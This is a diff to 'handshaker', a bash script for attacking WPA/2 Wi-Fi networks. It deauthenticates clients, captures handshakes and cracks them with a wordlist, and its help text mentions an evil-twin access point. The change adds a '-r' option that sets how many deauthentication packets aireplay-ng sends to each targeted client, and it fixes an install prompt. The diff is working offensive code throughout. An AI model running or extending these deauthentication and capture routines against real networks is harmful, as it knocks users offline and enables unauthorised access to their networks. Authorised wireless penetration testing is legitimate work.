@@ -31,9 +31,10 @@ handshaker - Detect, deauth, capture and crack WPA/2 handshakes. d4rkcat <rfarag
 		-i  - Wireless Interface card
 		-i2 - Second wireless card (better capture rate)
 		-w  - Wordlist to use for cracking
-		-d  - Deauth this many times for each AP (default 3)
-		-p  - Only attack clients above this power level
 		-o  - Save handshakes to custom directory
+		-d  - Attempts to capture for each AP (default 3)
+		-r  - Deauth packets sent to each client (default 1)
+		-p  - Only attack clients above this power level
 		-g  - Use android GPS to record AP location
 		-t  - Timeout to wait for GPS at startup (default 2)
 		-b  - Use evil twin AP to capture handshakes
@@ -69,8 +70,9 @@ pyrit"
 		do
 			if [ $(which $COMMAND) -z ] 2> /dev/null
 				then
-					echo $RED" [>] $COMMAND not found, install now? [Y/n]"
-					read -p "  >"$GRN DOINST
+					clear
+					echo $RED" [>] $GRN$COMMAND$RED was not found, install it now?$GRN [Y/n]"
+					read -p "  >" DOINST
 					case $DOINST in
 					"")INST=1;;
 					"Y")INST=1;;
@@ -97,9 +99,9 @@ pyrit"
 											echo " [*] $COMMAND Installed"
 									fi
 							fi
+							INST=""
 					fi
 			fi
-			INST=""
 		done
 	clear
 	if [ $CRACK = "1" ] 2> /dev/null
@@ -149,6 +151,10 @@ pyrit"
 			fi
 	fi
 	iw reg set BO
+	if [ $PACKS -z ] 2> /dev/null
+		then
+			PACKS=1
+	fi
 	if [ $GPS -z ] 2> /dev/null
 		then		
 			CHKILL=$(airmon-ng check kill | grep trouble)
@@ -718,7 +724,7 @@ fautocap()																#Deauth targets and collect handshakes
 								do
 									MACNUM=$((MACNUM + 1))
 									echo
-									aireplay-ng -0 1 -a $BSSID -c $CLIENT $MON1 | grep sdvds&
+									aireplay-ng -0 $PACKS -a $BSSID -c $CLIENT $MON1 | grep sdvds&
 									sleep 1
 									echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
 									fanalyze
@@ -745,7 +751,7 @@ fautocap()																#Deauth targets and collect handshakes
 										do
 											MACNUM=$((MACNUM + 1))
 											echo
-											aireplay-ng -0 1 -a $BSSID -c $CLIENT $MON2 | grep rvzsdb&
+											aireplay-ng -0 $PACKS -a $BSSID -c $CLIENT $MON2 | grep rvzsdb&
 											sleep 1
 											echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
 											fanalyze
@@ -775,7 +781,7 @@ fautocap()																#Deauth targets and collect handshakes
 								do
 									MACNUM=$((MACNUM + 1))
 									echo
-									aireplay-ng -0 1 -a $BSSID -c $CLIENT $MON1 | grep rvzsdb&
+									aireplay-ng -0 $PACKS -a $BSSID -c $CLIENT $MON1 | grep rvzsdb&
 									sleep 1
 									echo -e $RED" [*]$GRN Deauth client $MACNUM:\t $CLIENT$RED\t Launched [*]"
 									fanalyze
@@ -1120,6 +1126,6 @@ ACNT=1
 for ARG in $@
 	do
 		ACNT=$((ACNT + 1))
-		case $ARG in "-m")MDK=1;;"-b")EVIL=1;;"-t")TIMEOUT=$(echo $@ | cut -d " " -f $ACNT);;"-g")GPS=1;;"-i2")NIC2=$(echo $@ | cut -d " " -f $ACNT);;"-s")SILENT=1;;"-o")OUTDIR=$(echo $@ | cut -d " " -f $ACNT);;"-p")POWERLIMIT=$(echo $@ | cut -d " " -f $ACNT);;"-d")DEAU=1;TRIES=$(echo $@ | cut -d " " -f $ACNT);;"-c")CRACK=1;PCAP=$(echo $@ | cut -d " " -f $ACNT);;"-l")DO='L';;"-h")fhelp;;"-e")DO='E';ACNT=$((ACNT - 1));PARTIALESSID=$(echo $@ | cut -d " " -f $ACNT);;"-i")NIC=$(echo $@ | cut -d " " -f $ACNT);;"-w")WORDLIST=$(echo $@ | cut -d " " -f $ACNT);;"-a")DO='A';;"")fstart;esac
+		case $ARG in "-r")PACKS=$(echo $@ | cut -d " " -f $ACNT);;"-m")MDK=1;;"-b")EVIL=1;;"-t")TIMEOUT=$(echo $@ | cut -d " " -f $ACNT);;"-g")GPS=1;;"-i2")NIC2=$(echo $@ | cut -d " " -f $ACNT);;"-s")SILENT=1;;"-o")OUTDIR=$(echo $@ | cut -d " " -f $ACNT);;"-p")POWERLIMIT=$(echo $@ | cut -d " " -f $ACNT);;"-d")DEAU=1;TRIES=$(echo $@ | cut -d " " -f $ACNT);;"-c")CRACK=1;PCAP=$(echo $@ | cut -d " " -f $ACNT);;"-l")DO='L';;"-h")fhelp;;"-e")DO='E';ACNT=$((ACNT - 1));PARTIALESSID=$(echo $@ | cut -d " " -f $ACNT);;"-i")NIC=$(echo $@ | cut -d " " -f $ACNT);;"-w")WORDLIST=$(echo $@ | cut -d " " -f $ACNT);;"-a")DO='A';;"")fstart;esac
 	done
 fstart
